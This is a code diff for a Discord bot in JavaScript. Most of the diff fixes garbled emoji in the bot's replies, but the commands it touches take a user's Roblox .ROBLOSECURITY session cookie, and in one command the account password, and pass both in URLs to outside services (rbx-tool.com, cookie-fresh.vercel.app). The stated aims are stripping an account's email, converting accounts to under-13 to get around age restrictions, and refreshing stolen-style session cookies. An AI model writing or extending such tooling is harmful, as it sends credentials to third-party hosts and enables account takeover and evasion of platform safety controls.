@@ -68,7 +68,7 @@ client.on('interactionCreate', async interaction => {
   const allowedChannel = '1392522417254961273';
   if (interaction.channelId !== allowedChannel) {
     return interaction.reply({
-      content: 'âŒ You can only use this command in the designated channel.',
+      content: '😂 That wont work budd.',
       ephemeral: true
     });
   }
@@ -76,7 +76,7 @@ client.on('interactionCreate', async interaction => {
   if (interaction.commandName === 'bypass2008') {
     const cookie = interaction.options.getString('cookie');
 
-    await interaction.reply({ content: 'âœ… Command Successfully', ephemeral: true });
+    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });
 
     try {
       const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`);
@@ -84,7 +84,7 @@ client.on('interactionCreate', async interaction => {
 
       const embed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
-        .setTitle(data.status === "success" ? "âœ… Success" : "âŒ Failed")
+        .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
         .setDescription(data.message || (data.status === "success"
           ? "Success removing email!"
           : "Unknown error"))
@@ -97,7 +97,7 @@ client.on('interactionCreate', async interaction => {
     } catch {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
-        .setTitle("ðŸš« Request Failed")
+        .setTitle("❌ Request Failed")
         .setDescription("Request blocked or failed to fetch data.")
         .setFooter({
           text: `Requested by ${interaction.user.tag}`,
@@ -111,7 +111,7 @@ client.on('interactionCreate', async interaction => {
     const cookie = interaction.options.getString('cookie');
     const password = interaction.options.getString('password');
 
-    await interaction.reply({ content: 'âœ… Command Successfully', ephemeral: true });
+    await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });
 
     try {
       const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`);
@@ -119,7 +119,7 @@ client.on('interactionCreate', async interaction => {
 
       const embed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
-        .setTitle(data.status === "success" ? "âœ… Success" : "âŒ Failed")
+        .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
         .setDescription(data.message || (data.status === "success"
           ? "Success converting 13+ to under 13!"
           : "Unknown error"))
@@ -132,7 +132,7 @@ client.on('interactionCreate', async interaction => {
     } catch {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
-        .setTitle("ðŸš« Request Failed")
+        .setTitle("❌ Request Failed")
         .setDescription("Request blocked or failed to fetch data.")
         .setFooter({
           text: `Requested by ${interaction.user.tag}`,
@@ -145,7 +145,7 @@ client.on('interactionCreate', async interaction => {
   if (interaction.commandName === 'refreshcookie') {
     const cookie = interaction.options.getString('cookie');
 
-    await interaction.reply({ content: 'ðŸ”„ Refreshing your cookie...', ephemeral: true });
+    await interaction.reply({ content: '🧾 Refreshing your cookie...', ephemeral: true });
 
     try {
       const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
@@ -154,7 +154,7 @@ client.on('interactionCreate', async interaction => {
       if (!data.redemptionResult || !data.redemptionResult.success) {
         const errorEmbed = new EmbedBuilder()
           .setColor(0xef4444)
-          .setTitle("âŒ Unable to refresh your cookie.")
+          .setTitle("❌ Unable to refresh your cookie.")
           .setDescription("Roblox might have rejected the cookie or the backend failed.")
           .setFooter({
             text: `Requested by ${interaction.user.tag}`,
@@ -167,7 +167,7 @@ client.on('interactionCreate', async interaction => {
 
       const publicEmbed = new EmbedBuilder()
         .setColor(0x22c55e)
-        .setTitle("âœ… Successfully refreshed cookie!")
+        .setTitle("✅ Successfully refreshed cookie!")
         .setFooter({
           text: `Requested by ${interaction.user.tag}`,
           iconURL: interaction.user.displayAvatarURL()
@@ -177,7 +177,7 @@ client.on('interactionCreate', async interaction => {
 
       const privateEmbed = new EmbedBuilder()
         .setColor(0x0ea5e9)
-        .setTitle("ðŸ” Your New .ROBLOSECURITY Cookie")
+        .setTitle("🔑 Your New .ROBLOSECURITY Cookie")
         .setDescription(`\`\`\`${refreshed}\`\`\``)
         .setFooter({
           text: `Requested by ${interaction.user.tag}`,
@@ -192,7 +192,7 @@ client.on('interactionCreate', async interaction => {
     } catch (err) {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
-        .setTitle("ðŸš« Request Failed")
+        .setTitle("❌ Request Failed")
         .setDescription("Failed to connect to refresh API or bad response.")
         .setFooter({
           text: `Requested by ${interaction.user.tag}`,
